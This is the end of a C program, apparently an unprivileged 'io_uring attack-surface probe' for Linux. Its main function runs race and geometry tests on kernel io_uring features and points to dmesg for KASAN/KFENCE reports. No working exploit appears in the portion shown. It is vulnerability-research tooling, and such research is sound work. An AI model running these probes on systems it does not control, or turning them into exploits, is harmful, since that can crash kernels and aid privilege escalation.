        WARN("File table was updated %ld times concurrently — "
             "check for refcount race in io_fixed_fd_install", ctx.updates);

out:
    ring_close(&r);
    for (int i = 0; i < N; i++) {
        close(fds[i]);
        close(alt_fds[i]);
    }
    WARN("check dmesg for KASAN/KFENCE");
}

/* ================================================================== */
/* main                                                                */
/* ================================================================== */
int main(void)
{
    printf("==========================================================\n");
    printf(" io_uring attack-surface probe\n");
    printf(" Linux 6.18 / Ubuntu 24.04 — unprivileged\n");
    printf("==========================================================\n");
    printf(" UID=%d  EUID=%d\n", (int)getuid(), (int)geteuid());

    /* Quick ring open sanity check */
    {
        ring_t r;
        if (ring_open(&r, 8, 0) < 0) {
            FAIL("io_uring_setup sanity check failed — is CONFIG_IO_URING=y?");
            return 1;
        }
        int res = ring_submit_nop(&r, 0xDEAD);
        if (res == 0)
            OK("io_uring sanity check passed (NOP res=%d)", res);
        else
            WARN("NOP returned %d", res);
        ring_close(&r);
    }

    test_pbuf_ring_head();
    test_send_zc_race();
    test_ring_geometry();
    test_zcrx_probe();
    test_files_race();

    printf("\n==========================================================\n");
    printf(" All tests complete. Run: sudo dmesg | grep -E 'KASAN|KFENCE|BUG'\n");
    printf("==========================================================\n");
    return 0;
}
